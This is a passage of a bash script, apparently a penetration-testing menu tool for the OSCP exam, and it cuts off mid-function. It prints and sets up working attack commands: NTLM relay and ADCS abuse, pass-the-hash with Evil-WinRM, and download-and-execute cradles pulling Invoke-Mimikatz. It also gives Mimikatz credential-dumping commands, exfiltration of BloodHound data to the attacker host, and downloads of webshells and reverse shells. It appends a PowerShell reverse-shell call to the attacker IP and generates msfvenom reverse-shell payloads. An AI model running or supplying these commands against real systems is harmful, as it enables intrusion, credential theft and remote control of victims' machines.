echo "   sudo python3 /opt/impacket/examples/ntlmrelayx.py -6 -wh $ActiveHost -l /tmp -socks -debug"
echo "   sudo python3 /opt/impacket/examples/ntlmrelayx.py -6 -wh $ActiveHost -t smb://$ADIP -l /tmp -socks -debug"
echo "   sudo python3 /opt/impacket/examples/ntlmrelayx.py -t ldaps://$ADIP -wh $ActiveHost --delegateaccess"
echo "   sudo python3 /opt/impacket/examples/getST.py -spn www/$FQDN -dc-ip $ADIP -impersonate Administrator $ADdomain/$ActiveUsername:$ActivePass"
echo
echo "   ADCS"
echo "   sudo python3 /opt/impacket/examples/ntlmrelayx.py -t http://$ADIP/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController"
echo "   .\Rubues.exe asktgt /user /certificate:<BASE64-CERTIFICATE> /ptt"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

MenuRepositories(){
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Evil-WinRM: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   sudo apt install ruby-full"
echo "   sudo gem install evil-winrm"
echo
echo "  $ProxyChains evil-winrm -i $ActiveHost -u $ActiveUsername -H $NTHash "
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    PetitPotam: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory" 
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    ZeroLogon Tester ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py"
echo
echo "   mfsconsole"
echo "   use auxiliary/admin/dcerpc/cve_2020_1472_zerologon"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

MenuFileTransfers(){
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Linux Web Commands: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'"
echo "   php -r 'const BUFFER = 1024; $fremote = fopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);"
echo "   php -r '$rfile = \"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"; $lfile = \"LinEnum.sh\"; $fp = fopen($lfile, \"w+\"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'"
echo "   php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num => $line) { echo $line; }' | bash"
echo
echo "   Python2"
echo "   import urllib"
echo "   urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")"
echo
echo "   Python3"
echo "   import urllib.request"
echo "   urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")"
echo
echo
echo "   Ruby"
echo "   ruby -e \'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))\'"
echo
echo "   Perl"
echo "   perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] File Transfer Commands: listed in Web Server Menu ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   Upload"
echo "   scp C:\\Temp\\bloodhound.zip root@$ActiveHost:/tmp/bloodhound.zip"
echo "   Download"
echo "   scp $ActiveUsername@$ActiveHost:/tmp/mimikatz.exe C:\Temp\mimikatz.exe"
echo
echo "   Upload"
echo "   pscp32.exe / pscp64.exe C:\\Users\\Public\\info.txt root@$ActiveHost:/tmp/info.txt" 
echo "   Download"
echo "   pscp32.exe / pscp64.exe $ActiveUsername@$ActiveHost:/home/user/secret.txt C:\\Users\\Public\\secret.txt"
echo
echo "   nc -nlvp 80 > mimikatz.exe"
echo "   nc -nv $ActiveHost 80 </tmp/mimikatz.exe"
echo
echo "   wget http://$ActiveHost:80/info.txt -O /tmp/info.txt"
echo "   curl -o /tmp/info.txt http://$ActiveHost:80/info.txt"
echo
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Encoding Commands: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   cat binary | base64 -w 0"
echo "   <base64> | base64 -d > binary"
echo
echo "   certutil.exe -encode mimikatz.exe mimikatz.txt"
echo "   certutil.exe -decode mimikatz.txt mimikatz.exe"
echo
echo "   openssl.exe enc -base64 -in mimikatz.exe -out mimikatz.txt"
echo "   openssl.exe enc -base64 -d -in mimikatz.txt -out mimikatz.exe"
echo
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Windows Web Commands: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
echo "   Invoke-WebRequest \"http://$ActiveHost/mimikatz.exe\" -OutFile \"C:\\Users\\Public\\mimikatz.exe\""
echo "   Invoke-RestMethod \"http://$ActiveHost/mimikatz.exe\" -OutFile \"C:\\Users\\Public\\mimikatz.exe\"" 
echo
echo "   nc -lvnp 443"
echo "   $Base64String = [System.convert]::ToBase64String((Get-Content -Path 'c:/temp/BloodHound.zip' -Encoding Byte)) Invoke-WebRequest -Uri http://$ActiveHost:443 -Method POST -Body $Base64String"
echo "   echo <base64> | base64 -d -w 0 > bloodhound.zip"
echo
echo "   Powershell 3+"
echo "   IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -UseBasicParsing)"
echo "   Any Powershell"
echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\""
echo "   (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1\", \"C:\Users\Public\Invoke-Mimikatz.ps1\")"
echo
echo "   CertUtil"
echo "   certutil.exe -urlcache -split -f https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"
echo "   certutil.exe -verifyctl -split -f https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"
echo
echo "   tftp -i $ActiveHost get mimikatz.exe"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] File Transfer Commands: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   python3 /opt/impacket/examples/smbserver.py share . -smb2support"
echo
echo "   Make sure the root password matches"
echo "   python3 /opt/impacket/examples/smbserver.py share . -smb2support -username root -password toor" 
echo
echo "   smbclient //$ActiveHost/share -U username -W domain"
echo "   net use Q: \\$ActiveHost\share"
echo "   xcopy \\\\$ActiveHost\\share\\mimikatz.exe mimikatz.exe"
echo "   pushd \\\\$ActiveHost\\share"
echo "   mklink /D share \\\\$ActiveHost\\share"
echo
echo "   BitsAdmin"
echo "   bitsadmin /transfer DLJob http://$ActiveHost/nc64.exe C:\Temp\nc64.exe" 
echo "   Download"
echo "   Import-Module bitstransfer;Start-BitsTransfer -Source \"http://$ActiveHost/nc.exe\" -Destination \"C:\\Temp\\nc.exe\""
echo "   Upload"
echo "   Start-BitsTransfer "C:\\Temp\\bloodhound.zip" -Destination "http://$ActiveHost/share/bloodhound.zip" -TransferType Upload"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Web Servers: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   python -m SimpleHTTPServer 80"
echo "   python3 -m http.server 80"
echo "   ruby -run -ehttpd . -p80"
echo "   php -S 0.0.0.0:80"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

function read_sysinternals(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m List of Executables: [+] Section Start: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
cd $HOME/OSCPShare/sysinternals
ls *.exe
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m List of Executables: [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo -n "[+] What is the name of the executable e.g. *PsExec.exe* (use wildcard for all e.g. *.*):"$'\n'

read executable

echo $executable > $scriptlocation/vars/searchinternals.txt
}

SysInternalsSearch(){
read_sysinternals
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Windows Server SysInternal Suite: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
cd $HOME/OSCPShare/sysinternals
for file in $executable;do
echo "   -----------------------------------------------------------------------------------------   "
    echo "   IEX (iwr 'http://$LocalIP/sysinternals/$file')"
    echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/sysinternals/$file -OutFile $file"
    echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/sysinternals/$file')\""
    echo "   (New-Object System.Net.WebClient).DownloadFile(\"http://$LocalIP/sysinternals/$file\", \"C:\\Users\\Public\\$file\")"
    echo "   Import-Module bitstransfer;Start-BitsTransfer -Source \"http://$LocalIP/sysinternals/$file\" -Destination \"C:\\Temp\\$file\""
    echo "   certutil.exe -urlcache -split -f http://$LocalIP/sysinternals/$file"
    echo "   certutil.exe -verifyctl -split -f http://$LocalIP/sysinternals/$file $file"
echo "   -----------------------------------------------------------------------------------------   "
done
echo
echo -e "\e[32m cd $HOME/OSCPShare"
echo -e "\e[32m python3 -m http.server 80"
echo -e "\e[32m python -m SimpleHTTPServer 80"
echo -e "\e[32m ruby -run -ehttpd . -p80"
echo -e "\e[32m php -S 0.0.0.0:80"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

SysInternals() {
read -p "[i] Do you wish to use the Sysinternals Suite executables? (yY/nN)" sysinternal
case "$sysinternal" in
  y|Y ) SysInternalsSearch ;;
  n|N ) ShowMeMore ;;
  * ) echo "   Invalid";;
esac
}

ServeWeb(){
echo
cd $HOME/OSCPShare
echo -e "\e[32m cd $HOME/OSCPShare"
echo -e "\e[32m python3 -m http.server 80"
echo -e "\e[32m python -m SimpleHTTPServer 80"
echo -e "\e[32m ruby -run -ehttpd . -p80"
echo -e "\e[32m php -S 0.0.0.0:80"
echo
echo "   Upload Files from Target system" 
echo "   updog [-d DIRECTORY] [-p PORT] [--password PASSWORD] [--ssl]" 
echo "   http://$LocalIP/PORT"
echo "   https://$LocalIP/PORT"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
}

Linux(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Linux Server: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
cd $HOME/OSCPShare
for file in pspy32;do
    echo "   scp $HOME/OSCPShare/$file root@$ActiveHost:/tmp/$file"
    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/OSCPShare/$file C:\\Temp\\$file"
    echo "   wget http://$LocalIP:80/$file -O /tmp/$file"
    echo "   curl -o $HOME/OSCPShare/$file http://$ActiveHost:80/$file"
    echo "   nc -nlvp 80 > $file"
    echo "   nc -nv $LocalIP 80 </tmp/$file"
echo "   -----------------------------------------------------------------------------------------   "
done
for file in pspy64;do
    echo "   scp $HOME/OSCPShare/$file root@$ActiveHost:/tmp/$file"
    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/OSCPShare/$file C:\\Temp\\$file"
    echo "   wget http://$LocalIP:80/$file -O /tmp/$file"
    echo "   curl -o $HOME/OSCPShare/$file http://$ActiveHost:80/$file"
    echo "   nc -nlvp 80 > $file"
    echo "   nc -nv $LocalIP 80 </tmp/$file"
echo "   -----------------------------------------------------------------------------------------   "
done
for file in *.sh;do
    echo "   scp $HOME/OSCPShare/$file root@$ActiveHost:/tmp/$file"
    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/OSCPShare/$file C:\\Temp\\$file"
    echo "   wget http://$LocalIP:80/$file -O /tmp/$file"
    echo "   curl -o $HOME/OSCPShare/$file http://$ActiveHost:80/$file"
    echo "   nc -nlvp 80 > $file"
    echo "   nc -nv $LocalIP 80 </tmp/$file"
echo "   -----------------------------------------------------------------------------------------   "
done
for file in windows-php-reverse-shell.php;do
    echo "   IEX (iwr 'http://$LocalIP/$file')"
    echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/$file -OutFile $file"
    echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/$file')\""
    echo "   (New-Object System.Net.WebClient).DownloadFile(\"http://$LocalIP/$file\", \"C:\\Users\\Public\\$file\")"
    echo "   Import-Module bitstransfer;Start-BitsTransfer -Source \"http://$LocalIP/$file\" -Destination \"C:\\Temp\\$file\""
    echo "   certutil.exe -urlcache -split -f http://$LocalIP/$file" $file
    echo "   certutil.exe -verifyctl -split -f http://$LocalIP/$file"
done
echo "   -----------------------------------------------------------------------------------------   "
echo
ServeWeb
}

BatFiles(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Windows Server: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
cd $HOME/OSCPShare
for file in *.bat;do
    echo "   IEX (iwr 'http://$LocalIP/$file')"
    echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/$file -OutFile $file"
    echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/$file')\""
    echo "   (New-Object System.Net.WebClient).DownloadFile(\"http://$LocalIP/$file\", \"C:\\Users\\Public\\$file\")"
    echo "   Import-Module bitstransfer;Start-BitsTransfer -Source \"http://$LocalIP/$file\" -Destination \"C:\\Temp\\$file\""
    echo "   certutil.exe -urlcache -split -f http://$LocalIP/$file" $file
    echo "   certutil.exe -verifyctl -split -f http://$LocalIP/$file"
echo "   -----------------------------------------------------------------------------------------   "
done
ServeWeb
}

ExeFiles(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Windows Exe Files: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
cd $HOME/OSCPShare
for file in *.exe;do
    echo "   IEX (iwr 'http://$LocalIP/$file')"
    echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/$file -OutFile $file"
    echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/$file')\""
    echo "   (New-Object System.Net.WebClient).DownloadFile(\"http://$LocalIP/$file\", \"C:\\Users\\Public\\$file\")"
    echo "   Import-Module bitstransfer;Start-BitsTransfer -Source \"http://$LocalIP/$file\" -Destination \"C:\\Temp\\$file\""
    echo "   certutil.exe -urlcache -split -f http://$LocalIP/$file" $file
    echo "   certutil.exe -verifyctl -split -f http://$LocalIP/$file"
echo "   -----------------------------------------------------------------------------------------   "
done
echo
ServeWeb
}

PS1Files(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Windows PowerShell Files: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
cd $HOME/OSCPShare
for file in *.ps1;do
    echo "   IEX (iwr 'http://$LocalIP/$file')"
    echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/$file -OutFile $file"
    echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/$file')\""
    echo "   (New-Object System.Net.WebClient).DownloadFile(\"http://$LocalIP/$file\", \"C:\\Users\\Public\\$file\")"
    echo "   Import-Module bitstransfer;Start-BitsTransfer -Source \"http://$LocalIP/$file\" -Destination \"C:\\Temp\\$file\""
    echo "   certutil.exe -urlcache -split -f http://$LocalIP/$file" $file
    echo "   certutil.exe -verifyctl -split -f http://$LocalIP/$file"
echo "   -----------------------------------------------------------------------------------------   "
done
echo
ServeWeb
}

ASPFiles(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Windows Web Shells: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
cd $HOME/OSCPShare
for file in *.asp;do
    echo "   IEX (iwr 'http://$LocalIP/$file')"
    echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/$file -OutFile $file"
    echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/$file')\""
    echo "   (New-Object System.Net.WebClient).DownloadFile(\"http://$LocalIP/$file\", \"C:\\Users\\Public\\$file\")"
    echo "   Import-Module bitstransfer;Start-BitsTransfer -Source \"http://$LocalIP/$file\" -Destination \"C:\\Temp\\$file\""
    echo "   certutil.exe -urlcache -split -f http://$LocalIP/$file" $file
    echo "   certutil.exe -verifyctl -split -f http://$LocalIP/$file"
echo "   -----------------------------------------------------------------------------------------   "
done
for file in *.aspx;do
    echo "   IEX (iwr 'http://$LocalIP/$file')"
    echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/$file -OutFile $file"
    echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/$file')\""
    echo "   (New-Object System.Net.WebClient).DownloadFile(\"http://$LocalIP/$file\", \"C:\\Users\\Public\\$file\")"
    echo "   Import-Module bitstransfer;Start-BitsTransfer -Source \"http://$LocalIP/$file\" -Destination \"C:\\Temp\\$file\""
    echo "   certutil.exe -urlcache -split -f http://$LocalIP/$file" $file
    echo "   certutil.exe -verifyctl -split -f http://$LocalIP/$file"
echo "   -----------------------------------------------------------------------------------------   "
done
echo
ServeWeb
}

PHPFiles(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Web Shells PHP: Do not forget to EDIT IP - PORT! ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
cd $HOME/OSCPShare
echo "   Linux:"
for file in php-reverse-shell.php;do
    echo "   scp $HOME/OSCPShare/$file root@$ActiveHost:/tmp/$file"
    echo "   scp $ActiveUsername@$ActiveHost:/$HOME/OSCPShare/$file C:\\Temp\\$file"
    echo "   wget http://$LocalIP:80/$file -O /tmp/$file"
    echo "   curl -o $HOME/OSCPShare/$file http://$ActiveHost:80/$file"
    echo "   nc -nlvp 80 > $file"
    echo "   nc -nv $LocalIP 80 </tmp/$file"
echo "   -----------------------------------------------------------------------------------------   "
done
echo "   Windows:"
for file in windows-php-reverse-shell.php;do
    echo "   IEX (iwr 'http://$LocalIP/$file')"
    echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/$file -OutFile $file"
    echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/$file')\""
    echo "   (New-Object System.Net.WebClient).DownloadFile(\"http://$LocalIP/$file\", \"C:\\Users\\Public\\$file\")"
    echo "   Import-Module bitstransfer;Start-BitsTransfer -Source \"http://$LocalIP/$file\" -Destination \"C:\\Temp\\$file\""
    echo "   certutil.exe -urlcache -split -f http://$LocalIP/$file" $file
    echo "   certutil.exe -verifyctl -split -f http://$LocalIP/$file"
echo "   -----------------------------------------------------------------------------------------   "
done
echo
ServeWeb
}

Mimikatz(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] MimiKatz Internet: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
cd $HOME/OSCPShare
    echo "   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
    echo "   Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1"
    echo "   . .\\Invoke-Mimikatz.ps1"
    echo "   Invoke-Mimikatz -DumpCreds"
    echo "   Invoke-Mimikatz -Command '\"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::lsa /inject\" \"lsadump::sam\" \"lsadump::cache\" \"sekurlsa::ekeys\" \"exit\"'"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo -e "\e[96m ${bold}    [+] MimiKatz Local x86: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
cd $HOME/OSCPShare/Win32
for file in *.*;do
    echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/Win32/$file -OutFile $file"
    echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/Win32/$file')\""
    echo "   certutil.exe -urlcache -split -f http://$LocalIP/Win32/$file" $file 
echo "   -----------------------------------------------------------------------------------------   "
done
echo
echo -e "\e[96m ${bold}    [+] MimiKatz Local x64: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
cd $HOME/OSCPShare/x64
for file in *.*;do
    echo "   powershell Invoke-WebRequest -Uri http://$LocalIP/x64/$file -OutFile $file"
    echo "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/x64/$file')\""
    echo "   certutil.exe -urlcache -split -f http://$LocalIP/x64/$file" $file
echo "   -----------------------------------------------------------------------------------------   "
done
echo
ServeWeb
}

SrvMyWebCMD(){
ReconstructVars
Linux
Windows
BatFiles
ExeFiles
PS1Files
PHPFiles
ASPFiles
Mimikatz
ServeWeb
SysInternals
}

ChoiceFiles() {
	echo
	echo -e "\e[96m ${bold}    [i] Choose your File Selection\e[30m ${normal}"
	echo
	echo -e "\e[32m"
        echo "        [1] Linux                    # Linux Files    "
	echo "        [2] Windows                  # Windows Files  "
	echo "        [3] .bat                     # Bat Files      "
	echo "        [4] .exe                     # Exe Files      "
	echo "        [5] .ps1                     # PS1 Files      "
	echo "        [6] .asp                     # ASP Files      "
	echo "        [7] .php                     # PHP Files      "
	echo "        [8] Mimikatz                 # Mimikatz Files "
        echo "        [9] SysInternals             # SysInternals   "
        echo "       [10] Show All                 # Show All       "
	echo "       [11] Quit?                    # Sure?          "
	echo -e "\e[30m"
	echo
read -p "  [?] Choices: (1/2/3/4/5/6/7) : " choice
case "$choice" in
  1 ) Linux ;;
  2 ) Windows ;;
  3 ) BatFiles ;;
  4 ) ExeFiles ;;
  5 ) PS1Files ;;
  6 ) ASPFiles ;;
  7 ) PHPFiles ;;
  8 ) Mimikatz ;;
  9 ) SysInternals ;;
  10 ) SrvMyWebCMD ;;
  11 ) Choices ;;
  * ) echo "   Invalid";;
esac
}


WebSrvDL() {
ReconstructVars
if [ ! -d $HOME/OSCPShare ];then
	mkdir $HOME/OSCPShare;
fi
cd $HOME/OSCPShare

wget https://download.sysinternals.com/files/SysinternalsSuite.zip
mkdir sysinternals
unzip SysinternalsSuite.zip -d $HOME/OSCPShare/sysinternals
wget https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
unzip pwdump8-8.2.zip
mv pwdump8/*.exe .
wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
unzip netcat-win32-1.11.zip
cp netcat-1.11/nc.exe .
cp netcat-1.11/nc64.exe .
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimikatz_trunk.zip
unzip mimikatz_trunk.zip
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1 -O SharpHound.ps1
wget https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/situational_awareness/network/Get-SPN.ps1 -O Get-SPN.ps1
cp /usr/share/davtest/backdoors/asp_cmd.asp $HOME/OSCPShare
cp /usr/share/webshells/aspx/cmdasp.aspx $HOME/OSCPShare
cp /usr/share/webshells/php/php-reverse-shell.php $HOME/OSCPShare
wget https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
wget https://github.com/1N3/PrivEsc/raw/master/linux/scripts/linux_privesc.sh
wget https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh
wget "https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php" -O windows-php-reverse-shell.php
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
wget https://github.com/carlospolop/PEASS-ng/releases/download/20221016/linpeas.sh
wget https://github.com/carlospolop/PEASS-ng/releases/download/20221016/winPEAS.bat
wget https://github.com/carlospolop/PEASS-ng/releases/download/20221016/winPEASany_ofs.exe
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
wget https://github.com/r3motecontrol/GhostpackCompiledBinaries/blob/master/SharpUp.exe
wget https://github.com/r3motecontrol/GhostpackCompiledBinaries/blob/master/Seatbelt.exe
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/Invoke-Portscan.ps1
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
echo -e "\nInvoke-PowerShellTcp -Reverse -IPAddress $LocalIP -Port 4444\n" >> $HOME/OSCPShare/Invoke-PowerShellTcp.ps1
wget https://github.com/besimorhino/powercat/raw/master/powercat.ps1 
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -O Rubeus.exe
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
7z e chisel_1.7.7_windows_amd64.gz
mv chisel_1.7.7_windows_amd64 chisel.exe
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
7z e chisel_1.7.7_linux_amd64.gz
chmod +x chisel
wget https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe -O plink32.exe
wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -O plink64.exe
wget https://the.earth.li/~sgtatham/putty/latest/w32/pscp.exe -O pscp32.exe
wget https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe -O pscp64.exe

pip3 install updog

cd /opt
if [ ! -d /opt/wesng ]; then
sudo git clone https://github.com/bitsadmin/wesng --depth 1
fi

cd /opt
if [ ! -d /opt/impacket ]; then
sudo git clone https://github.com/fortra/impacket.git
cd impacket
python3 -m pip install .
fi

sudo apt install linux-exploit-suggester
cd /usr/share/linux-exploit-suggester/
wget https://github.com/jondonas/linux-exploit-suggester-2.git 
sudo wget https://github.com/jondonas/linux-exploit-suggester-2/raw/master/linux-exploit-suggester-2.pl
sudo chmod +x linux-exploit-suggester-2.pl

cd $HOME/OSCPShare

SrvMyWebCMD
}

MenuWebServer() {
ReconstructVars

	echo -e "\e[0m ${bold}"
	echo "     [+] Choose your method:"
	echo
	echo "         1)  Show All Files                   "	
	echo "         2)  Let me choose                    "	
	echo "         3)  Construct WebServer to choose    "
	echo "         4)  Take me back to the menu         "		

	echo
	read -p "  [+] Choices: (1-20) : " choice

case "$choice" in
  1 ) SrvMyWebCMD ;;
  2 ) ChoiceFiles ;;
  3 ) WebSrvDL ;;
  4 ) ShowMeMore ;;
  * ) echo "Invalid" ;;
esac
}

Metasploit(){
payload=$(cat $scriptlocation/vars/msfvenom.txt)
echo
echo "Metasploit Handler"
echo 
cd $HOME/OSCPShare
echo "use exploit/multi/handler" > msfconsole.rc
echo "set PAYLOAD $payload" >> msfconsole.rc
echo "set LHOST $LocalIP" >> msfconsole.rc
echo "set LPORT $PORT" >> msfconsole.rc
echo "exploit -j" >> msfconsole.rc
echo "" >> msfconsole.rc
echo "Run this command:"
echo
echo "   msfconsole -r $HOME/OSCPShare/msfconsole.rc"
echo
echo "   Serve the file or upload it"
echo
echo "cd $HOME/OSCPShare"
echo
echo -e "\e[32m python3 -m http.server 80"
echo -e "\e[32m python -m SimpleHTTPServer 80"
ShowMeMore
}

LinuxMeterpreterReverseShell(){
echo "   Linux Meterpreter Reverse Shell (ELF)"
echo 
echo "Run this command:"
echo 
echo "   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$PORT -f elf > $HOME/OSCPShare/shell.elf"
echo "linux/x86/meterpreter/reverse_tcp" > $scriptlocation/vars/msfvenom.txt
Metasploit
}
LinuxBindMeterpreterShell(){
echo "   Linux Bind Meterpreter Shell (ELF)"
echo 
echo "Run this command:"
echo 
